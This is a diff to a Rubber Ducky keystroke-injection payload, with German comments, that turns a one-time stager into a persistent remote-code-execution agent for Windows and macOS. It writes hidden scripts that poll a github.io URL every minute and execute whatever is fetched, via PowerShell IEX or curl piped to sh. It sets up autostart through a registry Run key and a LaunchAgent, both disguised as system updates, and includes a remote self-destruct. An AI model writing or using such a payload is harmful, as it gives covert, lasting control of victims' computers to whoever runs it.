@@ -1,35 +1,21 @@
-REM Title: Remote code Execution
-REM Author: Panik-144
-REM Description: Executes code based on the existence of a file on a github pages website
-REM Target: Windows/ OSX
+ATTACKMODE HID STORAGE
 
-ATTACKMODE HID
+
+DELAY 500
+
+REM Title: Persistent Remote Code Execution (Final Version)
+REM Author: Panik-144 & Antigravity
+REM Description: Installs a persistent agent on Windows and macOS.
+REM Target: Windows/ OSX
 
 EXTENSION PASSIVE_WINDOWS_DETECT
     REM VERSION 1.1
     REM AUTHOR: Korben
-
-    REM_BLOCK DOCUMENTATION
-        Windows fully passive OS Detection and passive Detect Ready
-        Includes its own passive detect ready.
-        Does not require additional extensions.
-
-        USAGE:
-            Extension runs inline (here)
-            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
-            boot delay
-            $_OS will be set to WINDOWS or NOT_WINDOWS
-            See end of payload for usage within payload
-    END_REM
-
-    REM CONFIGURATION:
     DEFINE #MAX_WAIT 150
     DEFINE #CHECK_INTERVAL 20
     DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
     DEFINE #NOT_WINDOWS 7
-
     $_OS = #NOT_WINDOWS
-
     VAR $MAX_TRIES = #MAX_WAIT
     WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
         DELAY #CHECK_INTERVAL
@@ -38,35 +24,80 @@ EXTENSION PASSIVE_WINDOWS_DETECT
     IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
         $_OS = WINDOWS
     END_IF
-
-    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
-        IF ($_OS == WINDOWS) THEN
-            STRING HELLO WINDOWS!
-        ELSE
-            STRING HELLO WORLD!
-        END_IF
-    END_REM
 END_EXTENSION
 
 IF $_OS == WINDOWS THEN
-    REM Öffnet "Ausführen" Dialog (Win + R)
+    REM --- WINDOWS PERSISTENCE ---
     GUI r
     DELAY 500
-    REM Startet PowerShell versteckt
     STRINGLN powershell -WindowStyle Hidden
     DELAY 1000
-    REM Der Stager: Prüft alle 60s auf activate.ps1
-    STRINGLN Start-Job -ScriptBlock { while($true) { try { $u='https://panik-144.github.io/Rubber_Ducky/remote/activate.ps1?t='+(Get-Date).Ticks; $c=(iwr $u -UseBasicParsing -ErrorAction Stop).Content; if($c){ IEX $c; break } } catch {}; Start-Sleep -s 60 } }
+    
+    REM 1. Erstelle den dauerhaften Agenten (VBScript für Stealth) in Public
+    STRING $path = "$env:PUBLIC\win_update.ps1";
+    STRING $code = 'while($true){try{$u="https://panik-144.github.io/Rubber_Ducky/remote/activate.ps1?t="+(Get-Date).Ticks;$c=(iwr $u -UseBasicParsing -ErrorAction Stop).Content;if($c -match "SELF_DESTRUCT"){Remove-Item $env:PUBLIC\win_update.ps1 -Force; Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinSystemUpdate"; break} if($c){IEX $c}}catch{};Start-Sleep -s 60}';
+    STRING Set-Content -Path $path -Value $code;
+    ENTER
+    
+    DELAY 500
+
+    REM 2. Füge Autostart via Registry hinzu
+    STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinSystemUpdate" -Value "powershell -WindowStyle Hidden -File $env:PUBLIC\win_update.ps1" -PropertyType String -Force;
+    ENTER
+
+    DELAY 500
+    
+    REM 3. Starte den Agenten sofort
+    STRING Start-Process powershell -ArgumentList "-WindowStyle Hidden -File $env:PUBLIC\win_update.ps1"
+    ENTER
+    
 ELSE
-    REM Öffnet Spotlight
+    REM --- MACOS PERSISTENCE ---
     COMMAND SPACE
     DELAY 500
     STRING Terminal
     DELAY 500
     ENTER
     DELAY 1000
-    REM Der Stager: Prüft alle 60s auf activate.sh
-    STRINGLN nohup bash -c "while true; do content=$(curl -s -f 'https://panik-144.github.io/Rubber_Ducky/remote/activate.sh?t='$(date +%s)); if [ ! -z \"$content\" ]; then echo \"$content\" | sh; break; fi; sleep 60; done" >/dev/null 2>&1 &
+    
+    REM 1. Erstelle den versteckten Agenten im Home-Verzeichnis
+    STRINGLN echo 'while true; do c=$(curl -s -f "https://panik-144.github.io/Rubber_Ducky/remote/activate.sh?t=$(date +%s)"); if [[ "$c" == *"SELF_DESTRUCT"* ]]; then rm ~/.hidden_updater.sh; rm ~/Library/LaunchAgents/com.apple.systemupdate.plist; launchctl unload ~/Library/LaunchAgents/com.apple.systemupdate.plist; break; fi; if [ ! -z "$c" ]; then echo "$c" | sh; fi; sleep 60; done' > ~/.hidden_updater.sh
+    
     DELAY 200
-    STRINGLN killall Terminal
+
+    ENTER
+
+    STRINGLN chmod +x ~/.hidden_updater.sh
+
+    DELAY 200
+    
+    ENTER
+    REM 2. Erstelle den LaunchAgent für Autostart
+    STRINGLN mkdir -p ~/Library/LaunchAgents
+
+    DELAY 200
+
+    ENTER
+
+    STRINGLN echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.apple.systemupdate</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>'$HOME'/.hidden_updater.sh</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>60</integer></dict></plist>' > ~/Library/LaunchAgents/com.apple.systemupdate.plist
+    
+    DELAY 200
+
+    ENTER
+    REM 3. Lade und starte den Agenten
+    STRINGLN launchctl load ~/Library/LaunchAgents/com.apple.systemupdate.plist
+    
+    DELAY 200
+
+    ENTER
+    REM Aufräumen
+    DELAY 500
+    STRINGLN disown
+    STRINGLN exit
+    DELAY 500
+    COMMAND w
 END_IF
+
+
+
+
